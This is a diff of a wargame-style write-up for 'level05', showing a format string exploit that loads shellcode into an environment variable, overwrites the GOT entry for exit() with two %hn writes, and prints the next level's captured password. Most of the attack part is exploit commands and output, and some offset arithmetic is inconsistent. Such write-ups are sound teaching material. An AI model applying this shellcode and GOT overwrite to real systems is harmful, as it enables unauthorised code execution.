@@ -126,7 +126,8 @@ Yes!
 
 ## Exploitation
 
-We can put a shellcode in the env variables, then use the format string vulnerability to overwrite the exit() function address in the GOT with the address of our shellcode variable address.
+- We can put a shellcode in the env variables, since we cant put it in the input because of the to_lower() call on every character
+- Then we use the format string vulnerability to overwrite the exit() function address in the GOT with the address of our shellcode variable address.
 
 ### Finding the format string position
 
@@ -138,14 +139,19 @@ aaaa 64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 6161616
 
 ### Finding the address of the shellcode in the env variables
 
+From host:
 ```shell
-~$ export SHELLCODE=$(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
-~$ echo "$SHELLCODE"
-1���
-    Qh//shh/bin��̀
-
+~$ scp -P 4242 getenv.c level05@10.171.59.51:/tmp/getenv.c
 ```
-
+From override VM:
+```shell
+~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv
+~$ export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+~$ /tmp/getenv
+SHELLCODE: 0xffffd879
+```
+- The address of the variable is 0xffffd879, 4294957177 in decimal
+- 4294957277 is too big for a 32-bit integer, so we need to use split in 2 WORDs, ffff and d879, which is 65535 and 55417 in decimal.
 
 ### Finding the address of the exit function in the GOT
 
@@ -156,11 +162,20 @@ aaaa 64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 6161616
  804837b:	e9 b0 ff ff ff       	jmp    8048330 <_init+0x38>
 ```
 - The exit function address in the GOT is 0x80497e0
+- The two addresses we need to overwrite are 0x80497e0 and 0x80497e2
 
-### Assemble the ret2shellcode attack
+### The two padding values
+
+```
+LOWER_OFFSET  : 55517 - (2 * (address size)) = 55417 - 8         = 55409
+HIGHER_OFFSET : 65535 - LOWER_OFFSET - 8     = 65535 - 55409 - 8 = 10118
+```
+
+### Exploit
 
 ```shell
-~$ python -c 'print "\xe0\x97\x04\x08" + "\x90"*80 + "$9%n"' > /tmp/exploit05
-
-
-### Exploit 
+~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55409d%10$hn" + "%10118d%11$hn"'; cat) | ./level05
+               [...]
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
